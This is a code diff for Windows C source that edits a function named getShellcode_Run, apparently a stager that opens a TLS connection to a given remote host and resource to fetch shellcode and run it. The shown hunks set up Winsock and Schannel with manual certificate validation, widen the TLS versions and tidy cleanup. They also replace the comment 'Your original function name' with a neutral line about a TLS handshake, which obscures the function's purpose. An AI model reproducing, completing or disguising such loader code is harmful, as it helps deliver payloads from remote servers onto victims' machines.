@@ -20,7 +20,7 @@ void DebugOutput(const char* format, ...) {
     OutputDebugStringA(buffer);
 }
 
-// Cleanup function to handle resource deallocation
+// Cleanup function for resources
 void cleanup(SOCKET* ConnectSocket, CredHandle* hCred, CtxtHandle* hContext) {
     if (hContext->dwLower || hContext->dwUpper) {
         DeleteSecurityContext(hContext);
@@ -35,7 +35,7 @@ void cleanup(SOCKET* ConnectSocket, CredHandle* hCred, CtxtHandle* hContext) {
     WSACleanup();
 }
 
-// Your original function name
+// Function to perform the TLS handshake
 void getShellcode_Run(char* host, char* port, char* resource) {
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
@@ -81,7 +81,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     // Set up SCHANNEL_CRED
     SCHANNEL_CRED schannelCred = { 0 };
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
-    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_3_CLIENT;  // Enable TLS 1.3
+    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;  // Enable TLS 1.2 and 1.3
     schannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;
 
     // Acquire credentials handle
@@ -99,8 +99,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
     if (secStatus != SEC_E_OK) {
         DebugOutput("AcquireCredentialsHandle failed: 0x%08X\n", secStatus);
-        closesocket(ConnectSocket);
-        WSACleanup();
+        cleanup(&ConnectSocket, &hCred, &hContext);
         return;
     }
 
